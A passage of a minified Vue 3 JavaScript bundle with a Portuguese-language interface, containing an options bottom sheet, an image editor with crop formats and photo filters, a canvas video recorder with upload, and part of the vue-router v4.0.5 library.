                    t.value < n.value ? t.value += n.value / 33 : clearInterval(a)
                }), 10))
            })), {
                req: e.request,
                res: function(l) {
                    var s, o, r;
                    (null == (s = e.request.value) ? void 0 : s.emptyAsError) && null == l ? null == (o = e.request.value) || o.reject(l) : null == (r = e.request.value) || r.resolve(l), clearInterval(a), a = setInterval((() => {
                        t.value > 0 ? t.value -= n.value / 33 : (clearInterval(a), e.request.value = null)
                    }), 10)
                },
                height: t,
                max: n,
                isAndroid: l
            }
        }
    },
    Yo = sn("data-v-6c6185e0");
ln("data-v-6c6185e0");
const Zo = Pl("svg", {
        class: "mx-auto",
        height: "20",
        width: "35%"
    }, [Pl("line", {
        x1: "0",
        y1: "10",
        x2: "100%",
        y2: "10",
        style: {
            "stroke-width": "0.2rem"
        }
    })], -1),
    Qo = {
        class: "flex flex-col flex-1 overflow-y-auto hide-scroll"
    };
an();
const er = Yo(((e, t, n, l, a, s) => l.req ? (wl(), _l("div", {
    key: 0,
    container: "",
    class: "absolute inset-x-0 bottom-0 px-5 pt-5 z-10 flex flex-col",
    style: {
        height: l.height + "%",
        maxHeight: l.max + "%"
    }
}, [Pl("button", {
    onClick: t[1] || (t[1] = e => l.res()),
    class: "mb-4"
}, [Zo]), Pl("ul", Qo, [(wl(!0), _l(bl, null, fa(l.req.options, ((t, n) => {
    var a;
    return wl(), _l("li", {
        key: n,
        class: ["mb-8 text-4xl", t.classes],
        onClick: e => {
            var a;
            return l.res(null != (a = t.key) ? a : n)
        },
        innerHTML: null != (a = t.html) ? a : e.$filters.safeHTML(t.display)
    }, null, 10, ["onClick", "innerHTML"])
})), 128))])], 4)) : Ml("", !0)));
Xo.render = er, Xo.__scopeId = "data-v-6c6185e0";
const tr = {
        setup() {
            const e = io(),
                t = rt(),
                n = rt(),
                l = Ze({
                    top: 0,
                    left: 0,
                    width: 1920,
                    height: 1080,
                    filter: "none"
                });

            function a(e) {
                for (let t in e) l[t] = e[t]
            }
            async function s(e) {
                "landscape" === e ? a({
                    left: 0,
                    top: 0,
                    width: 1920,
                    height: 1080
                }) : "portrait" === e ? a({
                    left: 540,
                    top: 0,
                    width: 640,
                    height: 1080
                }) : "selfie" === e && a({
                    left: 400,
                    top: 240,
                    width: 640,
                    height: 640
                }), o()
            }

            function o() {
                const e = t.value,
                    a = e.getContext("2d"),
                    {
                        left: s,
                        top: o,
                        width: r,
                        height: i,
                        filter: c
                    } = l;
                e.width = r, e.height = i, a.filter = c, a.drawImage(n.value, s, o, r, i, 0, 0, r, i)
            }
            return vn((() => {
                const l = t.value.getContext("2d");
                var a;
                l instanceof CanvasRenderingContext2D && (a = e.original, new Promise((e => {
                    const t = new Image(1920, 1080);
                    t.onload = () => e(t), t.src = URL.createObjectURL(a)
                }))).then((e => {
                    l.drawImage(e, 0, 0, 1920, 1080);
                    const t = new Image;
                    t.onload = () => n.value = t, t.src = l.canvas.toDataURL("image/jpeg", .8)
                }))
            })), Rn(n, (() => {
                s(e.formats[0])
            })), {
                canvasElement: t,
                crop: s,
                formats: e.formats,
                filters: {
                    Nenhum: "none",
                    Clarendon: "sepia(.15) contrast(1.25) brightness(1.25) hue-rotate(5deg)",
                    Gingham: "contrast(1.1) brightness(1.1)",
                    Moon: "brightness(1.4) contrast(.95) saturate(0) sepia(.35)",
                    Lark: "sepia(.25) contrast(1.2) brightness(1.3) saturate(1.25)",
                    Reyes: "sepia(.75) contrast(.75) brightness(1.25) saturate(1.4)",
                    Juno: "sepia(.35) contrast(1.15) brightness(1.15) saturate(1.8)",
                    Slumber: "sepia(.35) contrast(1.25) saturate(1.25)",
                    Aden: "sepia(.2) brightness(1.15) saturate(1.4)",
                    Perpetua: "contrast(1.1) brightness(1.25) saturate(1.1)",
                    Mayfair: "contrast(1.1) brightness(1.15) saturate(1.1)",
                    Rise: "sepia(.25) contrast(1.25) brightness(1.2) saturate(.9)",
                    Hudson: "sepia(.25) contrast(1.2) brightness(1.2) saturate(1.05) hue-rotate(-15deg)",
                    Valencia: "sepia(.25) contrast(1.1) brightness(1.1)",
                    "X-Pro II": "sepia(.45) contrast(1.25) brightness(1.75) saturate(1.3) hue-rotate(-5deg)",
                    Willow: "brightness(1.2) contrast(.85) saturate(.05) sepia(.2)",
                    "Lo-Fi": "saturate(1.1) contrast(1.5)",
                    Inkwell: "brightness(1.25) contrast(.85) grayscale(1)",
                    Nashville: "sepia(.25) contrast(1.5) brightness(.9) hue-rotate(-15deg)"
                },
                setFilter: function(e) {
                    l.filter = e, o()
                },
                copyWithFilter: function(e) {
                    if (!n.value) return "null";
                    const {
                        left: t,
                        top: a,
                        width: s,
                        height: o
                    } = l, r = document.createElement("canvas"), i = r.getContext("2d");
                    return r.width = s, r.height = o, i.filter = e, i.drawImage(n.value, t, a, s, o, 0, 0, s, o), r.toDataURL("image/jpeg", .8)
                },
                discard: function() {
                    var t;
                    null == (t = e.ondiscard) || t.call(e), e.original = null
                },
                proceed: function() {
                    t.value.toBlob((t => {
                        var n;
                        null == (n = e.onproceed) || n.call(e, t), e.original = null
                    }), "image/jpeg", .8)
                }
            }
        }
    },
    nr = {
        class: "h-full bg-black py-16 absolute inset-0 z-10"
    },
    lr = Pl("h1", {
        class: "text-white text-center font-semibold mb-8"
    }, "Editor de Imagem", -1),
    ar = {
        ref: "canvasElement",
        width: "1920",
        height: "1080",
        class: "mx-auto max-w-full max-h-80 border"
    },
    sr = {
        class: "p-4"
    },
    or = Pl("label", {
        class: "text-white"
    }, "Formato", -1),
    rr = {
        class: "flex mt-4"
    },
    ir = {
        class: "p-4"
    },
    cr = Pl("label", {
        class: "text-white"
    }, "Filtros", -1),
    ur = {
        class: "flex mt-4 pb-4 overflow-x-auto fancy-scroll"
    },
    dr = {
        class: "text-white text-2xl mt-2"
    },
    pr = {
        class: "absolute bottom-12 left-2 right-2 flex justify-between"
    };
tr.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", nr, [lr, Pl("canvas", ar, null, 512), Pl("div", sr, [or, Pl("div", rr, [l.formats.includes("landscape") ? (wl(), _l("button", {
        key: 0,
        onClick: t[1] || (t[1] = e => l.crop("landscape")),
        class: "text-blue-500 border rounded-xl border-blue-500 px-4 py-2 flex-1"
    }, " Paisagem ")) : Ml("", !0), l.formats.includes("portrait") ? (wl(), _l("button", {
        key: 1,
        onClick: t[2] || (t[2] = e => l.crop("portrait")),
        class: "ml-4 text-blue-500 border rounded-xl border-blue-500 px-4 py-2 flex-1"
    }, " Retrato ")) : Ml("", !0), l.formats.includes("selfie") ? (wl(), _l("button", {
        key: 2,
        onClick: t[3] || (t[3] = e => l.crop("selfie")),
        class: "ml-4 text-blue-500 border rounded-xl border-blue-500 px-4 py-2 flex-1"
    }, " Selfie ")) : Ml("", !0)])]), Pl("div", ir, [cr, Pl("div", ur, [(wl(!0), _l(bl, null, fa(l.filters, ((e, t) => (wl(), _l("div", {
        class: "w-32 flex-shrink-0 flex flex-col mr-3 last:mr-0 text-center",
        key: t,
        onClick: t => l.setFilter(e)
    }, [Pl("img", {
        class: "h-32",
        src: l.copyWithFilter(e)
    }, null, 8, ["src"]), Pl("span", dr, g(t), 1)], 8, ["onClick"])))), 128))])]), Pl("div", pr, [Pl("button", {
        class: "px-4 py-2 border border-red-500 text-red-500 rounded-xl",
        onClick: t[4] || (t[4] = (...e) => l.discard && l.discard(...e))
    }, "Descartar"), Pl("button", {
        class: "px-4 py-2 border border-blue-400 text-blue-400 rounded-xl",
        onClick: t[5] || (t[5] = (...e) => l.proceed && l.proceed(...e))
    }, "Salvar")])])
};
const fr = {
        props: ["callback"],
        inject: ["setKeepInput"],
        setup(e) {
            jl("setDark")(), jl("setKeepInput")(!0);
            const t = rt(),
                n = rt(0),
                l = rt(!1),
                a = document.createElement("canvas");
            a.width = 1280, a.height = 720;
            let s, o, r, i = new lo(a);

            function c() {
                s = setInterval((() => n.value += 1), 1e3), l.value = !0, n.value = 0;
                const e = [t.value.captureStream(24), _o.microphone.value];
                o = new MediaRecorder(new MediaStream(e.map((e => null == e ? void 0 : e.getTracks())).filter((e => e)).flat()), {
                    videoBitsPerSecond: 2e6
                }), o.start(), t.value.toBlob((e => r = e), "image/jpeg", .8)
            }

            function u() {
                clearInterval(s), l.value = !1, o.ondataavailable = t => {
                    r && eo.uploadVideo(t.data).then((e => [e, r])).then(...e.callback)
                }, o.stop()
            }

            function d(e) {
                "Enter" === e.key && (l.value ? u() : c())
            }
            return vn((() => {
                i.onrender = e => {
                    const n = t.value;
                    n.getContext("2d").drawImage(e, 360, 0, e.width - 720, e.height, 0, 0, n.width, n.height)
                }
            })), _o.client.SetInVideoCall(!0), window.addEventListener("keydown", d), {
                video: t,
                duration: n,
                recording: l,
                view: i,
                start: c,
                stop: u,
                handler: d
            }
        },
        unmounted() {
            this.view.kill = !0, this.setKeepInput(!1), _o.client.SetInVideoCall(!1), window.removeEventListener("keydown", this.handler)
        }
    },
    mr = sn("data-v-065406ae");
ln("data-v-065406ae");
const hr = {
        class: "flex flex-col h-full bg-theme"
    },
    br = Pl("div", {
        class: "h-12"
    }, null, -1),
    gr = {
        class: "h-10 flex justify-center items-center"
    },
    vr = Pl("i", {
        class: "fas fa-circle text-red-600 text-sm"
    }, null, -1),
    xr = {
        class: "ml-2 text-theme"
    },
    yr = {
        width: "720",
        height: "1280",
        ref: "video"
    },
    kr = {
        class: "flex-1 relative flex justify-center items-center"
    },
    wr = Pl("i", {
        class: "fa fa-square text-4xl text-red-500"
    }, null, -1);
an();
const Cr = mr(((e, t, n, l, a, s) => (wl(), _l("div", hr, [br, Pl("div", gr, [l.recording ? (wl(), _l(bl, {
    key: 0
}, [vr, Pl("span", xr, g(e.$filters.duration(l.duration)), 1)], 64)) : Ml("", !0)]), Pl("canvas", yr, null, 512), Pl("div", kr, [l.recording ? (wl(), _l("button", {
    key: 1,
    onClick: t[2] || (t[2] = (...e) => l.stop && l.stop(...e)),
    class: "absolute mx-auto w-24 h-24 bg-gray-300 rounded-full flex flex-center"
}, [wr])) : (wl(), _l("button", {
    key: 0,
    onClick: t[1] || (t[1] = (...e) => l.start && l.start(...e)),
    class: "absolute mx-auto w-24 h-24 bg-red-600 border-4 border-gray-300 rounded-full"
}))])]))));
fr.render = Cr, fr.__scopeId = "data-v-065406ae";
/*!
 * vue-router v4.0.5
 * (c) 2021 Eduardo San Martin Morote
 * @license MIT
 */
const _r = "function" == typeof Symbol && "symbol" == typeof Symbol.toStringTag,
    Ar = e => _r ? Symbol(e) : "_vr_" + e,
    Sr = Ar("rvlm"),
    Rr = Ar("rvd"),
    Tr = Ar("r"),
    Er = Ar("rl"),
    Pr = Ar("rvl"),
    Lr = "undefined" != typeof window;
const Ir = Object.assign;

function Or(e, t) {
    const n = {};
    for (const l in t) {
        const a = t[l];
        n[l] = Array.isArray(a) ? a.map(e) : e(a)
    }
    return n
}
let Mr = () => {};
const Vr = /\/$/;

function Dr(e, t, n = "/") {
    let l, a = {},
        s = "",
        o = "";
    const r = t.indexOf("?"),
        i = t.indexOf("#", r > -1 ? r : 0);
    return r > -1 && (l = t.slice(0, r), s = t.slice(r + 1, i > -1 ? i : t.length), a = e(s)), i > -1 && (l = l || t.slice(0, i), o = t.slice(i, t.length)), l = function(e, t) {
        if (e.startsWith("/")) return e;
        if (!e) return t;
        const n = t.split("/"),
            l = e.split("/");
        let a, s, o = n.length - 1;
        for (a = 0; a < l.length; a++)
            if (s = l[a], 1 !== o && "." !== s) {
                if (".." !== s) break;
                o--
            } return n.slice(0, o).join("/") + "/" + l.slice(a - (a === l.length ? 1 : 0)).join("/")
    }(null != l ? l : t, n), {
        fullPath: l + (s && "?") + s + o,
        path: l,
        query: a,
        hash: o
    }
}

function Ur(e, t) {
    return !t || e.toLowerCase().indexOf(t.toLowerCase()) ? e : e.slice(t.length) || "/"
}

function Nr(e, t) {
    return (e.aliasOf || e) === (t.aliasOf || t)
}

function $r(e, t) {
    if (Object.keys(e).length !== Object.keys(t).length) return !1;
    for (let n in e)
        if (!jr(e[n], t[n])) return !1;
    return !0
}

function jr(e, t) {
    return Array.isArray(e) ? Fr(e, t) : Array.isArray(t) ? Fr(t, e) : e === t
}

function Fr(e, t) {
    return Array.isArray(t) ? e.length === t.length && e.every(((e, n) => e === t[n])) : 1 === e.length && e[0] === t
}
var zr, Br, Hr, qr;

function Gr(e) {
    if (!e)
        if (Lr) {
            const t = document.querySelector("base");
            e = (e = t && t.getAttribute("href") || "/").replace(/^\w+:\/\/[^\/]+/, "")
        } else e = "/";
    return "/" !== e[0] && "#" !== e[0] && (e = "/" + e), e.replace(Vr, "")
}(Br = zr || (zr = {})).pop = "pop", Br.push = "push", (qr = Hr || (Hr = {})).back = "back", qr.forward = "forward", qr.unknown = "";
const Wr = /^[^#]+#/;

function Kr(e, t) {
    return e.replace(Wr, "#") + t
}
const Jr = () => ({
    left: window.pageXOffset,
    top: window.pageYOffset
});

function Xr(e) {
    let t;
    if ("el" in e) {
        let n = e.el;
        const l = "string" == typeof n && n.startsWith("#"),
            a = "string" == typeof n ? l ? document.getElementById(n.slice(1)) : document.querySelector(n) : n;
        if (!a) return;
        t = function(e, t) {
            const n = document.documentElement.getBoundingClientRect(),
                l = e.getBoundingClientRect();
            return {
                behavior: t.behavior,
                left: l.left - n.left - (t.left || 0),
                top: l.top - n.top - (t.top || 0)
            }
        }(a, e)
    } else t = e;
    "scrollBehavior" in document.documentElement.style ? window.scrollTo(t) : window.scrollTo(null != t.left ? t.left : window.pageXOffset, null != t.top ? t.top : window.pageYOffset)
}

function Yr(e, t) {
    return (history.state ? history.state.position - t : -1) + e
}
const Zr = new Map;

function Qr(e, t) {
    const {
        pathname: n,
        search: l,
        hash: a
    } = t;
    if (e.indexOf("#") > -1) {
        let e = a.slice(1);
        return "/" !== e[0] && (e = "/" + e), Ur(e, "")
    }
    return Ur(n, e) + l + a
}

function ei(e, t, n, l = !1, a = !1) {
    return {
        back: e,
        current: t,
        forward: n,
        replaced: l,
        position: window.history.length,
        scroll: a ? Jr() : null
    }
}

function ti(e) {
    const {
        history: t,
        location: n
    } = window;
    let l = {
            value: Qr(e, n)
        },
        a = {
            value: t.state
        };

    function s(l, s, o) {
        const r = e.indexOf("#"),
            i = r > -1 ? (n.host && document.querySelector("base") ? e : e.slice(r)) + l : location.protocol + "//" + location.host + e + l;
        try {
            t[o ? "replaceState" : "pushState"](s, "", i), a.value = s
        } catch (c) {
            console.error(c), n[o ? "replace" : "assign"](i)
        }
    }
    return a.value || s(l.value, {
        back: null,
        current: l.value,
        forward: null,
        position: t.length - 1,
        replaced: !0,
        scroll: null
    }, !0), {
        location: l,
        state: a,
        push: function(e, n) {
            const o = Ir({}, a.value, t.state, {
                forward: e,
                scroll: Jr()
            });
            s(o.current, o, !0), s(e, Ir({}, ei(l.value, e, null), {
                position: o.position + 1
            }, n), !1), l.value = e
        },
        replace: function(e, n) {
            s(e, Ir({}, t.state, ei(a.value.back, e, a.value.forward, !0), n, {
                position: a.value.position
            }), !0), l.value = e
        }
    }
}

function ni(e) {
    const t = ti(e = Gr(e)),
        n = function(e, t, n, l) {
            let a = [],
                s = [],
                o = null;
            const r = ({
                state: s
            }) => {
                const r = Qr(e, location),
                    i = n.value,
                    c = t.value;
                let u = 0;
                if (s) {
                    if (n.value = r, t.value = s, o && o === i) return void(o = null);
                    u = c ? s.position - c.position : 0
                } else l(r);
                a.forEach((e => {
                    e(n.value, i, {
                        delta: u,
                        type: zr.pop,
                        direction: u ? u > 0 ? Hr.forward : Hr.back : Hr.unknown
                    })
                }))
            };

            function i() {
                const {
                    history: e
                } = window;
                e.state && e.replaceState(Ir({}, e.state, {
                    scroll: Jr()
                }), "")
            }
            return window.addEventListener("popstate", r), window.addEventListener("beforeunload", i), {
                pauseListeners: function() {
                    o = n.value
                },
                listen: function(e) {
                    a.push(e);
                    const t = () => {
                        const t = a.indexOf(e);
                        t > -1 && a.splice(t, 1)
                    };
                    return s.push(t), t
                },
                destroy: function() {
                    for (const e of s) e();
                    s = [], window.removeEventListener("popstate", r), window.removeEventListener("beforeunload", i)
                }
            }
        }(e, t.state, t.location, t.replace);
    const l = Ir({
        location: "",
        base: e,
        go: function(e, t = !0) {
            t || n.pauseListeners(), history.go(e)
        },
        createHref: Kr.bind(null, e)
    }, t, n);
    return Object.defineProperty(l, "location", {
        get: () => t.location.value
    }), Object.defineProperty(l, "state", {
        get: () => t.state.value
    }), l
}

function li(e) {
    return "string" == typeof e || "symbol" == typeof e
}
const ai = {
        path: "/",
        name: void 0,
        params: {},
        query: {},
        hash: "",
        fullPath: "/",
        matched: [],
        meta: {},
        redirectedFrom: void 0
    },
    si = Ar("nf");
var oi, ri;

function ii(e, t) {
    return Ir(new Error, {
        type: e,
        [si]: !0
    }, t)
}

function ci(e, t) {
    return e instanceof Error && si in e && (null == t || !!(e.type & t))
}(ri = oi || (oi = {}))[ri.aborted = 4] = "aborted", ri[ri.cancelled = 8] = "cancelled", ri[ri.duplicated = 16] = "duplicated";
const ui = {
        sensitive: !1,
        strict: !1,
        start: !0,
        end: !0
    },
    di = /[.+*?^${}()[\]/\\]/g;

function pi(e, t) {
    let n = 0;
    for (; n < e.length && n < t.length;) {
        const l = t[n] - e[n];
        if (l) return l;
        n++
    }
    return e.length < t.length ? 1 === e.length && 80 === e[0] ? -1 : 1 : e.length > t.length ? 1 === t.length && 80 === t[0] ? 1 : -1 : 0
}

function fi(e, t) {
    let n = 0;
    const l = e.score,
        a = t.score;
    for (; n < l.length && n < a.length;) {
        const e = pi(l[n], a[n]);
        if (e) return e;
        n++
    }
    return a.length - l.length
}
const mi = {
        type: 0,
        value: ""
    },
    hi = /[a-zA-Z0-9_]/;

function bi(e, t, n) {
    const l = function(e, t) {
            const n = Ir({}, ui, t);
            let l = [],
                a = n.start ? "^" : "";
            const s = [];
            for (const i of e) {
                const e = i.length ? [] : [90];
                n.strict && !i.length && (a += "/");
                for (let t = 0; t < i.length; t++) {
                    const l = i[t];
                    let o = 40 + (n.sensitive ? .25 : 0);
                    if (0 === l.type) t || (a += "/"), a += l.value.replace(di, "\\$&"), o += 40;
                    else if (1 === l.type) {
                        const {
                            value: e,
                            repeatable: n,
                            optional: c,
                            regexp: u
                        } = l;
                        s.push({
                            name: e,
                            repeatable: n,
                            optional: c
                        });
                        const d = u || "[^/]+?";
                        if ("[^/]+?" !== d) {
                            o += 10;
                            try {
                                new RegExp(`(${d})`)
                            } catch (r) {
                                throw new Error(`Invalid custom RegExp for param "${e}" (${d}): ` + r.message)
                            }
                        }
                        let p = n ? `((?:${d})(?:/(?:${d}))*)` : `(${d})`;
                        t || (p = c && i.length < 2 ? `(?:/${p})` : "/" + p), c && (p += "?"), a += p, o += 20, c && (o += -8), n && (o += -20), ".*" === d && (o += -50)
                    }
                    e.push(o)
                }
                l.push(e)
            }
            if (n.strict && n.end) {
                const e = l.length - 1;
                l[e][l[e].length - 1] += .7000000000000001
            }
            n.strict || (a += "/?"), n.end ? a += "$" : n.strict && (a += "(?:/|$)");
            const o = new RegExp(a, n.sensitive ? "" : "i");
            return {
                re: o,
                score: l,
                keys: s,
                parse: function(e) {
                    const t = e.match(o),
                        n = {};
                    if (!t) return null;
                    for (let l = 1; l < t.length; l++) {
                        const e = t[l] || "",
                            a = s[l - 1];
                        n[a.name] = e && a.repeatable ? e.split("/") : e
                    }
                    return n
                },
                stringify: function(t) {
                    let n = "",
                        l = !1;
                    for (const a of e) {
                        l && n.endsWith("/") || (n += "/"), l = !1;
                        for (const e of a)
                            if (0 === e.type) n += e.value;
                            else if (1 === e.type) {
                            const {
                                value: s,
                                repeatable: o,
                                optional: r
                            } = e, i = s in t ? t[s] : "";
                            if (Array.isArray(i) && !o) throw new Error(`Provided param "${s}" is an array but it is not repeatable (* or + modifiers)`);
                            const c = Array.isArray(i) ? i.join("/") : i;
                            if (!c) {
                                if (!r) throw new Error(`Missing required param "${s}"`);
                                a.length < 2 && (n.endsWith("/") ? n = n.slice(0, -1) : l = !0)
                            }
                            n += c
                        }
                    }
                    return n
                }
            }
        }(function(e) {
            if (!e) return [
                []
            ];
            if ("/" === e) return [
                [mi]
            ];
            if (!e.startsWith("/")) throw new Error(`Invalid path "${e}"`);

            function t(e) {
                throw new Error(`ERR (${n})/"${c}": ${e}`)
            }
            let n = 0,
                l = n;
            const a = [];
            let s;

            function o() {
                s && a.push(s), s = []
            }
            let r, i = 0,
                c = "",
                u = "";

            function d() {
                c && (0 === n ? s.push({
                    type: 0,
                    value: c
                }) : 1 === n || 2 === n || 3 === n ? (s.length > 1 && ("*" === r || "+" === r) && t(`A repeatable param (${c}) must be alone in its segment. eg: '/:ids+.`), s.push({
                    type: 1,
                    value: c,
                    regexp: u,
                    repeatable: "*" === r || "+" === r,
                    optional: "*" === r || "?" === r
                })) : t("Invalid state to consume buffer"), c = "")
            }

            function p() {
                c += r
            }
            for (; i < e.length;)
                if (r = e[i++], "\\" !== r || 2 === n) switch (n) {
                    case 0:
                        "/" === r ? (c && d(), o()) : ":" === r ? (d(), n = 1) : p();
                        break;
                    case 4:
                        p(), n = l;
                        break;
                    case 1:
                        "(" === r ? n = 2 : hi.test(r) ? p() : (d(), n = 0, "*" !== r && "?" !== r && "+" !== r && i--);
                        break;
                    case 2:
                        ")" === r ? "\\" == u[u.length - 1] ? u = u.slice(0, -1) + r : n = 3 : u += r;
                        break;
                    case 3:
                        d(), n = 0, "*" !== r && "?" !== r && "+" !== r && i--, u = "";
                        break;
                    default:
                        t("Unknown state")
                } else l = n, n = 4;
            return 2 === n && t(`Unfinished custom RegExp for param "${c}"`), d(), o(), a
        }(e.path), n),
        a = Ir(l, {
            record: e,
            parent: t,
            children: [],
            alias: []
        });
    return t && !a.record.aliasOf == !t.record.aliasOf && t.children.push(a), a
}

function gi(e, t) {
    const n = [],
        l = new Map;

    function a(e, n, l) {
        let r = !l,
            i = function(e) {
                return {
                    path: e.path,
                    redirect: e.redirect,
                    name: e.name,
                    meta: e.meta || {},
                    aliasOf: void 0,
                    beforeEnter: e.beforeEnter,
                    props: vi(e),
                    children: e.children || [],
                    instances: {},
                    leaveGuards: new Set,
                    updateGuards: new Set,
                    enterCallbacks: {},
                    components: "components" in e ? e.components || {} : {
                        default: e.component
                    }
                }
            }(e);
        i.aliasOf = l && l.record;
        const c = ki(t, e),
            u = [i];
        if ("alias" in e) {
            const t = "string" == typeof e.alias ? [e.alias] : e.alias;
            for (const e of t) u.push(Ir({}, i, {
                components: l ? l.record.components : i.components,
                path: e,
                aliasOf: l ? l.record : i
            }))
        }
        let d, p;
        for (const t of u) {
            let {
                path: u
            } = t;
            if (n && "/" !== u[0]) {
                let e = n.record.path,
                    l = "/" === e[e.length - 1] ? "" : "/";
                t.path = n.record.path + (u && l + u)
            }
            if (d = bi(t, n, c), l ? l.alias.push(d) : (p = p || d, p !== d && p.alias.push(d), r && e.name && !xi(d) && s(e.name)), "children" in i) {
                let e = i.children;
                for (let t = 0; t < e.length; t++) a(e[t], d, l && l.children[t])
            }
            l = l || d, o(d)
        }
        return p ? () => {
            s(p)
        } : Mr
    }

    function s(e) {
        if (li(e)) {
            const t = l.get(e);
            t && (l.delete(e), n.splice(n.indexOf(t), 1), t.children.forEach(s), t.alias.forEach(s))
        } else {
            let t = n.indexOf(e);
            t > -1 && (n.splice(t, 1), e.record.name && l.delete(e.record.name), e.children.forEach(s), e.alias.forEach(s))
        }
    }

    function o(e) {
        let t = 0;
        for (; t < n.length && fi(e, n[t]) >= 0;) t++;
        n.splice(t, 0, e), e.record.name && !xi(e) && l.set(e.record.name, e)
    }
    return t = ki({
        strict: !1,
        end: !0,
        sensitive: !1
    }, t), e.forEach((e => a(e))), {
        addRoute: a,
        resolve: function(e, t) {
            let a, s, o, r = {};
            if ("name" in e && e.name) {
                if (a = l.get(e.name), !a) throw ii(1, {
                    location: e
                });
                o = a.record.name, r = Ir(function(e, t) {
                    let n = {};
                    for (let l of t) l in e && (n[l] = e[l]);
                    return n
                }(t.params, a.keys.filter((e => !e.optional)).map((e => e.name))), e.params), s = a.stringify(r)
            } else if ("path" in e) s = e.path, a = n.find((e => e.re.test(s))), a && (r = a.parse(s), o = a.record.name);
            else {
                if (a = t.name ? l.get(t.name) : n.find((e => e.re.test(t.path))), !a) throw ii(1, {
                    location: e,
                    currentLocation: t
                });
                o = a.record.name, r = Ir({}, t.params, e.params), s = a.stringify(r)
            }
            const i = [];
            let c = a;
            for (; c;) i.unshift(c.record), c = c.parent;
            return {
                name: o,
                path: s,
                params: r,
                matched: i,
                meta: yi(i)
            }
        },
        removeRoute: s,
        getRoutes: function() {
            return n
        },
        getRecordMatcher: function(e) {
            return l.get(e)
        }
    }
}

function vi(e) {
    const t = {},
        n = e.props || !1;
    if ("component" in e) t.default = n;
    else
        for (let l in e.components) t[l] = "boolean" == typeof n ? n : n[l];
    return t
}

function xi(e) {
    for (; e;) {
        if (e.record.aliasOf) return !0;
        e = e.parent
    }
    return !1
}

function yi(e) {
    return e.reduce(((e, t) => Ir(e, t.meta)), {})
}

function ki(e, t) {
    let n = {};
    for (let l in e) n[l] = l in t ? t[l] : e[l];
    return n
}
const wi = /#/g,
    Ci = /&/g,
    _i = /\//g,
    Ai = /=/g,
    Si = /\?/g,
    Ri = /\+/g,
    Ti = /%5B/g,
    Ei = /%5D/g,
    Pi = /%5E/g,
    Li = /%60/g,
    Ii = /%7B/g,
    Oi = /%7C/g,
    Mi = /%7D/g,
    Vi = /%20/g;

function Di(e) {
    return encodeURI("" + e).replace(Oi, "|").replace(Ti, "[").replace(Ei, "]")
}

function Ui(e) {
    return Di(e).replace(Ri, "%2B").replace(Vi, "+").replace(wi, "%23").replace(Ci, "%26").replace(Li, "`").replace(Ii, "{").replace(Mi, "}").replace(Pi, "^")
}

function Ni(e) {
    return function(e) {
        return Di(e).replace(wi, "%23").replace(Si, "%3F")
    }(e).replace(_i, "%2F")
}

function $i(e) {
    try {
        return decodeURIComponent("" + e)
    } catch (t) {}
    return "" + e
}

function ji(e) {
    const t = {};
    if ("" === e || "?" === e) return t;
    const n = ("?" === e[0] ? e.slice(1) : e).split("&");
    for (let l = 0; l < n.length; ++l) {
        const e = n[l].replace(Ri, " ");
        let a = e.indexOf("="),
            s = $i(a < 0 ? e : e.slice(0, a)),
            o = a < 0 ? null : $i(e.slice(a + 1));
        if (s in t) {
            let e = t[s];
            Array.isArray(e) || (e = t[s] = [e]), e.push(o)
        } else t[s] = o
    }
    return t
}

function Fi(e) {
    let t = "";
    for (let n in e) {
        t.length && (t += "&");
        const l = e[n];
        if (n = Ui(n).replace(Ai, "%3D"), null == l) {
            void 0 !== l && (t += n);
            continue
        }
        let a = Array.isArray(l) ? l.map((e => e && Ui(e))) : [l && Ui(l)];
        for (let e = 0; e < a.length; e++) t += (e ? "&" : "") + n, null != a[e] && (t += "=" + a[e])
    }
    return t
}

function zi(e) {
    const t = {};
    for (let n in e) {
        let l = e[n];
        void 0 !== l && (t[n] = Array.isArray(l) ? l.map((e => null == e ? null : "" + e)) : null == l ? l : "" + l)
    }
    return t
}

function Bi() {
    let e = [];
    return {
        add: function(t) {
            return e.push(t), () => {
                const n = e.indexOf(t);
                n > -1 && e.splice(n, 1)
            }
        },
        list: () => e,
        reset: function() {
            e = []
        }
    }
}

function Hi(e, t, n, l, a) {
    const s = l && (l.enterCallbacks[a] = l.enterCallbacks[a] || []);
    return () => new Promise(((o, r) => {
        const i = e => {
                var i;
                !1 === e ? r(ii(4, {
                    from: n,
                    to: t
                })) : e instanceof Error ? r(e) : "string" == typeof(i = e) || i && "object" == typeof i ? r(ii(2, {
                    from: t,
                    to: e
                })) : (s && l.enterCallbacks[a] === s && "function" == typeof e && s.push(e), o())
            },
            c = e.call(l && l.instances[a], t, n, i);
        let u = Promise.resolve(c);
        e.length < 3 && (u = u.then(i)), u.catch((e => r(e)))
    }))
}

function qi(e, t, n, l) {
    const a = [];
    for (const o of e)
        for (const e in o.components) {
            let r = o.components[e];
            if ("beforeRouteEnter" === t || o.instances[e])
                if ("object" == typeof(s = r) || "displayName" in s || "props" in s || "__vccOpts" in s) {
                    const s = (r.__vccOpts || r)[t];
                    s && a.push(Hi(s, n, l, o, e))
                } else {
                    let s = r();
                    s = s.catch(console.error), a.push((() => s.then((a => {
                        if (!a) return Promise.reject(new Error(`Couldn't resolve component "${e}" at "${o.path}"`));
                        const s = (r = a).__esModule || _r && "Module" === r[Symbol.toStringTag] ? a.default : a;
                        var r;
                        o.components[e] = s;
                        const i = (s.__vccOpts || s)[t];
                        return i && Hi(i, n, l, o, e)()
                    }))))
                }
        }
    var s;
    return a
}

function Gi(e) {
    const t = jl(Tr),
        n = jl(Er),
        l = da((() => t.resolve(ut(e.to)))),
        a = da((() => {
            let {
                matched: e
            } = l.value, {
                length: t
            } = e;
            const a = e[t - 1];
            let s = n.matched;
            if (!a || !s.length) return -1;
            let o = s.findIndex(Nr.bind(null, a));
            if (o > -1) return o;
            let r = Ki(e[t - 2]);
            return t > 1 && Ki(a) === r && s[s.length - 1].path !== r ? s.findIndex(Nr.bind(null, e[t - 2])) : o
        })),
        s = da((() => a.value > -1 && function(e, t) {
            for (let n in t) {
                let l = t[n],
                    a = e[n];
                if ("string" == typeof l) {
                    if (l !== a) return !1
                } else if (!Array.isArray(a) || a.length !== l.length || l.some(((e, t) => e !== a[t]))) return !1
            }
            return !0
        }(n.params, l.value.params))),
        o = da((() => a.value > -1 && a.value === n.matched.length - 1 && $r(n.params, l.value.params)));
    return {
        route: l,
        href: da((() => l.value.href)),
        isActive: s,
        isExactActive: o,
        navigate: function(n = {}) {
            return function(e) {
                if (e.metaKey || e.altKey || e.ctrlKey || e.shiftKey) return;
                if (e.defaultPrevented) return;
                if (void 0 !== e.button && 0 !== e.button) return;
